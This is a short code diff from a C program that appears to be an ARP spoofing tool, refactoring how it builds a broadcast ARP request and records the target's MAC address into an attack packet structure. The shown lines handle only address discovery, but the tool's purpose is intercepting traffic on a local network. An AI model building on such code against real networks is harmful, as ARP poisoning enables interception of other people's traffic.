@@ -97,7 +97,6 @@ int main(int argc, char *argv[]){
     int res;
     pthread_t thr1, thr2;
     struct Attack_packet attack;
-    u_int8_t target_Mac[6];
     u_int8_t attacker_Mac[6];
     ////////////////////////////////////
     ///////Variable For Getting Mac/////
@@ -225,7 +224,7 @@ int main(int argc, char *argv[]){
         ethernet->Destination_Mac[i] = 0xff;
         ethernet->Source_Mac[i] = attacker_Mac[i];
         arp->Sender_Mac[i] = attacker_Mac[i];
-        target_Mac[i] = 0x00;
+        arp->Target_Mac[i] = 0x00;
 
     }
 
@@ -259,7 +258,6 @@ int main(int argc, char *argv[]){
             temp_arp = (struct ARP_HEADER *)(rev_packet+ETHERNET_SIZE);
             if(temp_arp->Opcode == 512){
                 for(i=0; i<6; i++){
-                    target_Mac[i] = temp_ethernet->Source_Mac[i];
                     attack.target_Mac[i] = temp_ethernet->Source_Mac[i];
                 }
                 printf("Found Target's Mac add..!!\n");
